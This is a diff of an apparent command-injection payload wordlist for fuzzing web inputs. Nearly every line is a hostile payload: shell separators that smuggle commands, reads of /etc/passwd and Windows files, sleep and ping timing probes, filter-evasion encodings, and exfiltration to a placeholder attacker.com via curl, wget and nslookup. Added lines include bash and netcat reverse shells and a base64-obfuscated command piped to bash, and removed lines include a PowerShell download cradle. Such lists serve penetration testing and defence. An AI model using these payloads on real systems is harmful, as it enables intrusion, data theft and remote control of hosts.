@@ -4,16 +4,6 @@
 &&id
 `id`
 $(id)
-;id;
-|id|
-||id||
-&&id&&
-; id
-| id
-|| id
-&& id
-` id `
-$( id )
 ;whoami
 |whoami
 ||whoami
@@ -21,44 +11,41 @@ $( id )
 `whoami`
 $(whoami)
 ;hostname
+;uname -a
 ;cat /etc/passwd
 |cat /etc/passwd
 ||cat /etc/passwd
 &&cat /etc/passwd
-`cat /etc/passwd`
-$(cat /etc/passwd)
-;cat /etc/shadow
-;ls -la
-|ls -la
-;ls /
+;ls -la /
+|ls /
 ;pwd
 ;env
 ;printenv
 ;ipconfig
-;net user
-;whoami /all
-;systeminfo
-;dir C:\
-;type C:\Windows\win.ini
+|ipconfig
+&&ipconfig
+&whoami
+&systeminfo
 ;ver
+;dir C:\
+&type C:\Windows\win.ini
 ; sleep 5
 | sleep 5
 || sleep 5
 && sleep 5
-; sleep 10
 `sleep 5`
 $(sleep 5)
+; sleep 10
 ; ping -c 5 127.0.0.1
 | ping -c 5 127.0.0.1
 ; ping 127.0.0.1 -n 5
 ; curl http://attacker.com/?c=$(id)
 ; wget http://attacker.com/?c=$(id)
-; curl http://attacker.com/$(id)
 | curl http://attacker.com/?c=`id`
+; nslookup $(id).attacker.com
 ${IFS}id
 ${IFS}cat${IFS}/etc/passwd
 $IFS$()id
-;{IFS}id
 ;cat${IFS}/etc/passwd
 ;cat$IFS/etc/passwd
 %3Bid
@@ -72,51 +59,30 @@ $IFS$()id
 %0a%0did
 ;%0aid
 |%0aid
-%0a id
-%0a id %0a
-%26id
 %0a/bin/sh -c id
-$(id)
-$((id))
-${id}
-`id`
-cat+/etc/passwd
-cat%09/etc/passwd
-cat</etc/passwd
 ca\t /etc/passwd
 c'a't /etc/passwd
-c"a"t /etc/passwd
 who$()ami
 w\hoami
 /usr/bin/id
 /usr/bin/whoami
-/bin/cat /etc/passwd
 /bin/sh -c id
 /bin/bash -c id
-bash -c {id}
 bash -c 'id'
 sh -c 'id'
-cmd /c id
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+; nc -e /bin/sh attacker.com 4444
 cmd /c whoami
 cmd.exe /c dir
 cmd.exe /c ipconfig /all
-powershell -c id
-powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
-; nc -e /bin/sh attacker.com 4444
-; bash -i >& /dev/tcp/attacker.com/4444 0>&1
-; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
+powershell -c whoami
+'; id; echo '
+' && id && '
 1;id
 1|id
 1||id
 1&&id
 -1;id
-&id
-^id
-test;id
-test|id
-";id;"
-';id;'
-" && id && "
-' && id && '
-1+1;id
-1%2b1;id
+; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
+; /usr/bin/python3 -c 'import os;os.system("id")'
+; perl -e 'system("id")'
